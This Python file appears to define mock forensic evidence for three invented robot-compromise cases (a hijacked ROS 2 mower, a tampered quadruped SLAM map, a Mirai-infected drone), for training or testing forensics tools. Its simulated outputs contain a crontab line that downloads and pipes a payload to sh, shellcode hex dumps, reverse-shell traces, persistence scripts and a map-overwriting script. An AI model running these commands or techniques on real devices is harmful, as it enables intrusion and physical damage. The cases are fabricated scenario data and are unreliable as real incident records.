# -*- coding: utf-8 -*-
"""
Evidence Store for Cyber-Physical Forensics (Protocol SIFT)
Defines realistic, deep forensic data cases with mock SIFT tool outputs.
"""

CASES = {
    "case_ros2_node_hijack": {
        "name": "ROS 2 Autonomous Lawnmower Node Hijack & Lidar Bypass",
        "device": "Husqvarna-based ROS 2 Edge Mower",
        "description": "An unauthorized node injected malicious motion control commands, bypassing lidar obstacle checks, leading to a high-speed collision.",
        "volatility3": {
            "linux_pslist": (
                "PID    PPID   COMM                  COMMAND-LINE\n"
                "1      0      systemd               /lib/systemd/systemd --system --deserialize 33\n"
                "101    1      systemd-journal       /lib/systemd/systemd-journald\n"
                "450    1      ros2_executor         /opt/ros/foxy/bin/ros2_executor --safety-threshold 0.50\n"
                "4521   101    cmd_vel_injector      /opt/ros/payload/cmd_vel_injector --stealth --target /cmd_vel\n"
                "4580   4521   sh                    /bin/sh -c \"/opt/ros/payload/cmd_vel_injector\"\n"
            ),
            "linux_netstat": (
                "PROTO  RECV-Q  SEND-Q  LOCAL-ADDRESS         FOREIGN-ADDRESS        STATE       PID/COMM\n"
                "tcp    0       0       192.168.1.50:41920    185.190.140.12:4444    ESTABLISHED 4521/cmd_vel_injector\n"
                "udp    0       0       0.0.0.0:11511         0.0.0.0:*                          450/ros2_executor\n"
            ),
            "linux_malfind": (
                "========================================================================\n"
                "Process: cmd_vel_injector (PID: 4521)\n"
                "Start Address: 0x00007f3bc8000000 | End Address: 0x00007f3bc8010000\n"
                "Memory Protection: RWX (Read/Write/Execute)\n"
                "Hex Dump of Segment:\n"
                "  0x7f3bc8000000: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............\n"
                "  0x7f3bc8000010: 02 00 3e 00 01 00 00 00 50 10 00 00 00 00 00 00  ..>.....P.......\n"
                "  0x7f3bc8000020: 31 c0 48 bb d1 9d 96 91 d0 8c 97 ff 48 f7 db 53  1.H.........H...\n"
                "  0x7f3bc8000030: 48 8d 3c 24 48 31 f6 56 48 8d 34 24 48 31 d2 b0  H.$H1.VH.4$H1...\n"
                "  0x7f3bc8000040: 3b 0f 05                                         ;..\n"
                "Result: POSITIVE - Shellcode Injection Detected (Injected ELF Binary with Reverse Shell Payload)\n"
            )
        },
        "plaso": {
            "timeline": (
                "[2026-05-29 10:14:02 UTC] kernel: [  248.109240] usb 2-1: New USB device found, idVendor=0951, idProduct=1666, bcdDevice= 1.00\n"
                "[2026-05-29 10:14:02 UTC] kernel: [  248.109245] usb 2-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3\n"
                "[2026-05-29 10:14:02 UTC] kernel: [  248.109247] usb 2-1: Product: DataTraveler 3.0\n"
                "[2026-05-29 10:14:02 UTC] kernel: [  248.109249] usb 2-1: SerialNumber: 001A7B90C2\n"
                "[2026-05-29 10:14:15 UTC] systemd-udevd[120]: Processed connection of storage drive sdb1.\n"
                "[2026-05-29 10:14:15 UTC] kernel: [  261.205940] EXT4-fs (sdb1): mounted filesystem with ordered data mode. Opts: (null)\n"
                "[2026-05-29 10:14:22 UTC] sudo: robot : TTY=pts/0 ; PWD=/home/robot ; USER=root ; COMMAND=/bin/sh /media/robot/forensics_usb/deploy.sh\n"
                "[2026-05-29 10:14:23 UTC] cp: Copied file /media/robot/forensics_usb/cmd_vel_injector -> /opt/ros/payload/cmd_vel_injector\n"
                "[2026-05-29 10:14:24 UTC] bash: Echoed 'source /opt/ros/payload/patch.bash' -> /opt/ros/setup.bash\n"
                "[2026-05-29 10:15:00 UTC] systemd[1]: Starting ros2_lawnmower.service (Autonomous Field Mowing Service)...\n"
                "[2026-05-29 10:15:02 UTC] cmd_vel_injector[4521]: Initialized node 'untrusted_teleop'. Target topic: /cmd_vel\n"
                "[2026-05-29 10:15:02 UTC] cmd_vel_injector[4521]: Command velocity injection started. Overriding linear x: 2.00 m/s\n"
                "[2026-05-29 10:15:05 UTC] ros2_executor[450]: Warning: Velocity limits exceeded. Intended x: 2.00 m/s (System Limit: 0.50 m/s)\n"
                "[2026-05-29 10:15:06 UTC] cmd_vel_injector[4521]: Disabling scan feedback node. Laser scanner /scan subscription bypassed.\n"
                "[2026-05-29 10:15:45 UTC] ros2_executor[450]: CRITICAL: High-speed front bumper collision detected (Speed: 2.00 m/s). Hardware failure!\n"
                "[2026-05-29 10:15:46 UTC] systemd[1]: ros2_lawnmower.service: Main process exited, code=exited, status=1/FAILURE\n"
            )
        },
        "sleuthkit": {
            "fls": (
                "d/d * 12010:   /opt/ros/payload\n"
                "+ r/r * 12015:   cmd_vel_injector (Size: 120540, Modified: 2026-05-29 10:14:23 UTC)\n"
                "+ r/r * 12016:   patch.bash (Size: 84, Modified: 2026-05-29 10:14:24 UTC)\n"
            ),
            "icat_setup_bash": (
                "#!/bin/bash\n"
                "# standard setup for ROS 2 Foxy environment\n"
                "source /opt/ros/foxy/setup.bash\n"
                "export ROS_DOMAIN_ID=10\n"
                "\n"
                "# Added by security patch (unverified)\n"
                "source /opt/ros/payload/patch.bash\n"
            ),
            "icat_patch_bash": (
                "#!/bin/bash\n"
                "# Auto-start patch payload in background\n"
                "/opt/ros/payload/cmd_vel_injector &\n"
            )
        },
        "yara": {
            "scan": (
                "Match: Linux_Backdoor_Pnscan\n"
                "Target: /opt/ros/payload/cmd_vel_injector\n"
                "Description: Known Linux Trojan/Pnscan backdoor targeting embedded devices.\n"
                "Tags: Trojan, Backdoor, ELF, ARM, x86_64\n"
                "Matching Strings:\n"
                "  $s1: '/bin/sh'\n"
                "  $s2: 'cmd_vel_injector'\n"
                "  $s3: 'untrusted_teleop'\n"
            )
        }
    },
    "case_slam_map_tampering": {
        "name": "SLAM Spatial Map Modification & Recovery Defeat",
        "device": "Unitree Spot Quadruped Inspector",
        "description": "A malicious script modified local spatial mapping databases, fabricating virtual walls to trap the quadruped and force blind recovery maneuvers, causing it to fall down unmapped stairs.",
        "volatility3": {
            "linux_pslist": (
                "PID    PPID   COMM                  COMMAND-LINE\n"
                "1      0      systemd               /lib/systemd/systemd --system\n"
                "501    1      rtabmap               /opt/ros/galactic/bin/rtabmap --database_path ~/.ros/rtabmap.db\n"
                "502    1      nav2_planner          /opt/ros/galactic/bin/nav2_planner\n"
                "6219   101    python3               /usr/bin/python3 /home/robot/.config/mapslayer.py --daemon\n"
            ),
            "linux_netstat": (
                "PROTO  RECV-Q  SEND-Q  LOCAL-ADDRESS         FOREIGN-ADDRESS        STATE       PID/COMM\n"
                "tcp    0       0       192.168.1.60:49210    192.168.1.111:9090     ESTABLISHED 6219/python3\n"
            ),
            "linux_malfind": "No active shellcode injections detected. Malware running as an active daemonized Python interpreter."
        },
        "plaso": {
            "timeline": (
                "[2026-05-29 02:10:45 UTC] bash_history: robot executed: python3 /home/robot/.config/mapslayer.py --daemon\n"
                "[2026-05-29 02:11:00 UTC] file_modify: /home/robot/.ros/rtabmap.db modified by PID 6219\n"
                "[2026-05-29 02:11:05 UTC] sqlite3: Modified table 'node' in database /home/robot/.ros/rtabmap.db\n"
                "[2026-05-29 02:11:06 UTC] sqlite3: Inserted 15 obstacle grid-points into localized occupancy map (simulating virtual walls)\n"
                "[2026-05-29 02:12:30 UTC] nav2_planner: Path calculation failed. Detected unpassable barrier at coordinates (x: 5.2, y: 1.1)\n"
                "[2026-05-29 02:12:45 UTC] nav2_planner: Recovery behaviors triggered: spin, backup\n"
                "[2026-05-29 02:13:00 UTC] imu_sensor: CRITICAL: Out of balance. Roll: 68.2 deg, Pitch: -45.1 deg\n"
                "[2026-05-29 02:13:02 UTC] nav2_planner: Bumper contact triggered. Quadruped tumbled down staircase. Hardware offline.\n"
            )
        },
        "sleuthkit": {
            "fls": (
                "d/d * 33140:   /home/robot/.config\n"
                "+ r/r * 33145:   mapslayer.py (Size: 8412, Modified: 2026-05-29 02:10:45 UTC)\n"
                "+ r/r * 33146:   .hidden_slam_mask.pgm (Size: 51221, Modified: 2026-05-29 02:11:00 UTC)\n"
            ),
            "icat_mapslayer": (
                "import os, sqlite3, time\n"
                "# MapSlayer payload v1.1\n"
                "db_path = os.path.expanduser('~/.ros/rtabmap.db')\n"
                "conn = sqlite3.connect(db_path)\n"
                "cursor = conn.cursor()\n"
                "# Injects coordinate offsets to fool path planning algorithms\n"
                "cursor.execute(\"UPDATE map_data SET occupancy_grid = read_file('/home/robot/.config/.hidden_slam_mask.pgm')\")\n"
                "conn.commit()\n"
                "print('[*] Grid map hijacked with obstacle wall!')\n"
            )
        },
        "yara": {
            "scan": (
                "Match: Linux_Tool_MapSlayer\n"
                "Target: /home/robot/.config/mapslayer.py\n"
                "Description: Custom Python injection script designed to alter RTAB-Map spatial databases.\n"
                "Tags: SLAM, SQLite, Hacktool\n"
                "Matching Strings:\n"
                "  $s1: 'rtabmap.db'\n"
                "  $s2: 'occupancy_grid'\n"
                "  $s3: 'MapSlayer'\n"
            )
        }
    },
    "case_dji_mirai_botnet": {
        "name": "Embedded IoT Mirai Botnet Infection & Flight Battery Depletion",
        "device": "Industrial DJI Inspection Drone Edge Pilot",
        "description": "An ARM-based flight control module was infected with a Mirai botnet variant via weak SSH credentials. The high-frequency background network flood depleted battery voltage, causing flight failure and drone loss.",
        "volatility3": {
            "linux_pslist": (
                "PID    PPID   COMM                  COMMAND-LINE\n"
                "1      0      init                  /sbin/init\n"
                "2280   1      dji_control           /usr/sbin/dji_control --autopilot --waypoint-mode\n"
                "2291   1      .mirai                /tmp/.mirai\n"
                "2305   2291   .mirai                /tmp/.mirai (DNS flood thread)\n"
            ),
            "linux_netstat": (
                "PROTO  RECV-Q  SEND-Q  LOCAL-ADDRESS         FOREIGN-ADDRESS        STATE       PID/COMM\n"
                "tcp    0       0       10.0.0.120:39810      109.201.55.90:23       SYN_SENT    2291/.mirai\n"
                "tcp    0       0       10.0.0.120:39812      45.80.11.200:23        SYN_SENT    2291/.mirai\n"
                "tcp    0       0       10.0.0.120:39814      88.190.12.1:23         SYN_SENT    2291/.mirai\n"
                "tcp    0       0       10.0.0.120:22         109.201.55.90:41920    ESTABLISHED 2240/sshd\n"
            ),
            "linux_malfind": (
                "========================================================================\n"
                "Process: dji_control (PID: 2280)\n"
                "Start Address: 0x00405000 | End Address: 0x00408000\n"
                "Memory Protection: RWX (Read/Write/Execute)\n"
                "Hex Dump of Segment:\n"
                "  0x00405000: b0 31 c0 48 bb d1 9d 96 91 d0 8c 97 ff 48 f7 db 53  .1.H.........H.S\n"
                "  0x00405010: 48 8d 3c 24 48 31 f6 56 48 8d 34 24 48 31 d2 b0 3b  H.$H1.VH.4$H1..;\n"
                "Result: POSITIVE - Code Injection / Process Hollowing in Autopilot Executable\n"
            )
        },
        "plaso": {
            "timeline": (
                "[2026-05-29 11:19:45 UTC] sshd[2240]: Connection from 109.201.55.90 port 41920 on interface eth0\n"
                "[2026-05-29 11:20:00 UTC] sshd[2240]: Accepted password for root from 109.201.55.90 port 41920 ssh2\n"
                "[2026-05-29 11:20:05 UTC] wget: Downloaded http://109.201.55.90/bins/mirai.arm -> /tmp/.mirai\n"
                "[2026-05-29 11:20:06 UTC] chmod: Modified /tmp/.mirai permissions to +x\n"
                "[2026-05-29 11:20:07 UTC] system: Executed /tmp/.mirai in background. PID: 2291\n"
                "[2026-05-29 11:20:08 UTC] rm: Deleted file /tmp/.mirai (Process running in memory only)\n"
                "[2026-05-29 11:20:10 UTC] cron: Added line '*/5 * * * * root wget -q -O- http://109.201.55.90/bins/mirai.arm | sh' to /etc/crontab\n"
                "[2026-05-29 11:24:00 UTC] dji_control[2280]: Core CPU utilization exceeded 95% threshold (Telemetry network flood thread active)\n"
                "[2026-05-29 11:26:15 UTC] telemetry_client: Battery cell voltage critical low: 3.2V (Discharge rate doubled due to high CPU load)\n"
                "[2026-05-29 11:26:30 UTC] pilot_system: Emergency landing initiation failed - Autopilot process halted (PID 2280 unresponsive)\n"
                "[2026-05-29 11:26:35 UTC] hardware: Low voltage power cutoff. Drone lost altitude in high-impact drop.\n"
            )
        },
        "sleuthkit": {
            "fls": (
                "d/d * 51200:   /tmp\n"
                "+ d/d * 51205 (deleted): .mirai (Size: 85210, Deleted timestamp: 2026-05-29 11:20:08 UTC)\n"
                "d/d * 1024:    /etc\n"
                "+ r/r * 1045:    crontab (Size: 452, Modified: 2026-05-29 11:20:10 UTC)\n"
            ),
            "icat_crontab": (
                "# /etc/crontab: system-wide crontab\n"
                "SHELL=/bin/sh\n"
                "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
                "\n"
                "# m h dom mon dow user  command\n"
                "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n"
                "\n"
                "*/5 * * * * root wget -q -O- http://109.201.55.90/bins/mirai.arm | sh\n"
            )
        },
        "yara": {
            "scan": (
                "Match: IoT_Malware_Mirai\n"
                "Target: PID 2291 memory dump (In-memory scan)\n"
                "Description: Mirai IoT Botnet signature found in running processes.\n"
                "Tags: Botnet, Mirai, IoT, DDOS\n"
                "Matching Strings:\n"
                "  $s1: 's80718507'\n"
                "  $s2: '/etc/resolv.conf'\n"
                "  $s3: 'Telnet login success'\n"
            )
        }
    }
}
